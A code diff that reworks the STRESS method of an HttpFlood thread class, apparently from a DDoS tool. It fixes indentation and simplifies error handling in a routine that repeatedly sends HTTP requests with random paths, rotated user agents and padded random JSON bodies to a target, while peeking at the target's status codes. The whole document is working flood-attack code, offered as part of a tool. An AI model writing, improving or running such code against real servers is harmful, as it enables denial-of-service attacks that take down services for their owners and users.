@@ -1167,50 +1167,40 @@ class HttpFlood(Thread):
     def STRESS(self) -> None:
         s = None
         try:
-             s = self.open_connection()
-             global CONNECTIONS_SENT
-             CONNECTIONS_SENT += 1
-             print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] STRESS: High-Load Packet Sent to {self._target.authority}")
+            s = self.open_connection()
+            global CONNECTIONS_SENT
+            CONNECTIONS_SENT += 1
+            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] STRESS: High-Load Packet Sent to {self._target.authority}")
 
-         for _ in range(self._rpc):
-            # [OPTIMIZED] Dynamic Path
-            path = self.get_random_target_path()
-            ua = randchoice(self._useragents)
-            headers = self.build_consistent_headers(ua)
-            
-            # Rebuild payload manually to include dynamic path
-            payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
-                       f"Host: {self._target.authority}\r\n"
-                       f"User-Agent: {ua}\r\n"
-                       f"{headers}"
-                       f"Content-Length: 524\r\n"
-                       f"X-Requested-With: XMLHttpRequest\r\n"
-                       f"Content-Type: application/json\r\n\r\n"
-                       f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
-            
-            # [NEW] Status Tracker (Sniffer)
-            try:
-                # Peek at the response (first 20 bytes)
-                response_start = s.recv(20).decode('utf-8', errors='ignore')
-                if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
-                    status_code = response_start.split(" ")[1]
-                    print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] STRESS: Server Response Received")
-            except: pass # Non-blocking or incomplete response
-            
-            Tools.send(s, payload.encode("utf-8"))
+            for _ in range(self._rpc):
+                # [OPTIMIZED] Dynamic Path
+                path = self.get_random_target_path()
+                ua = randchoice(self._useragents)
+                headers = self.build_consistent_headers(ua)
+                
+                # Rebuild payload manually to include dynamic path
+                payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
+                           f"Host: {self._target.authority}\r\n"
+                           f"User-Agent: {ua}\r\n"
+                           f"{headers}"
+                           f"Content-Length: 524\r\n"
+                           f"X-Requested-With: XMLHttpRequest\r\n"
+                           f"Content-Type: application/json\r\n\r\n"
+                           f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
+                
+                # [NEW] Status Tracker (Sniffer)
+                try:
+                    # Peek at the response (first 20 bytes)
+                    response_start = s.recv(20).decode('utf-8', errors='ignore')
+                    if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
+                        status_code = response_start.split(" ")[1]
+                        print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] STRESS: Server Response Received")
+                except:
+                    pass # Non-blocking or incomplete response
+                
+                Tools.send(s, payload.encode("utf-8"))
         except Exception as e:
-            err = str(e)
-            if "timed out" in err or "Timeout" in err:
-                # print(f"[DEBUG] STRESS: Connection Timeout (Target Lagging/Down)")
-                pass
-            elif "[Errno 111]" in err or "Connection refused" in err:
-                pass
-            elif "[Errno 104]" in err or "Reset by peer" in err:
-                pass
-            elif "Broken pipe" in err:
-                pass
-            else:
-                pass
+            pass
         Tools.safe_close(s)
 
     def COOKIES(self) -> None:
